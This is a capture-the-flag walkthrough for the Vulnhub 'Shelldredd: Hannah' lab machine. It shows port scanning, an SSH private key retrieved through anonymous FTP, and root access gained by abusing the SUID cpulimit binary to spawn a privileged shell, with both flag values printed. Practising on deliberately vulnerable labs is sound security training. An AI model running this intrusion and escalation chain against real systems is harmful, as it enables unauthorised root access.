---
title: "Shelldredd: Hannah Vulnhub CTF Walkthrough"
---
The vulnhub virtual machine can be found [here](https://www.vulnhub.com/entry/onsystem-shelldredd-1-hannah,545/)
nmap
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/credit-card-scammers]
└─$ nmap -p- -sV 192.168.56.110
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-25 05:27 EDT
Nmap scan report for 192.168.56.110
Host is up (0.0027s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
61000/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
{% endhighlight %}

Logging into the FTP service anonymously and snooping around:

{% highlight terminal %}
ftp> ls -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        115          4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .hannah
226 Directory send OK.
ftp> cd .hannah
250 Directory successfully changed.
ftp> ls -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
-rwxr-xr-x    1 0        0            1823 Aug 06  2020 id_rsa
226 Directory send OK.
ftp> 
{% endhighlight %}

We've been given a private key. let's use that to log into the ssh server
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/shelldredd-hannah]
└─$ chmod 700 id_rsa                                                           130 ⨯
                                                                                     
┌──(kali㉿kali)-[~/ctfs/shelldredd-hannah]
└─$ ssh hannah@192.168.56.110 -i id_rsa -p 61000
Linux ShellDredd 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Sep  5 09:20:42 2020 from 192.168.1.140
hannah@ShellDredd:~$
{% endhighlight %}

I'm in. lets take a look around for flags and test for a few low hanging fruit. 

first flag: 
{% highlight terminal %}
hannah@ShellDredd:~$ cat user.txt 
Gr3mMhbCpuwxCZorqDL3ILPn
{% endhighlight %}


{% highlight terminal %}
hannah@ShellDredd:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mawk
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/cpulimit
/usr/bin/mount
/usr/bin/passwd
{% endhighlight %}


Here we can exploit the SUID binary [cpulimit](https://gtfobins.github.io/gtfobins/cpulimit/). 

{% highlight terminal %}
hannah@ShellDredd:~$ cpulimit -l 100 -f -- /bin/sh -p
Process 823 detected
# id
uid=1000(hannah) gid=1000(hannah) euid=0(root) egid=0(root) grupos=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(hannah)
# whoami
root
# cd
# ls
user.txt
# cd ../../root
# ls
root.txt
# cat root.txt
yeZCB44MPH2KQwbssgTQ2Nof
# 
{% endhighlight %}
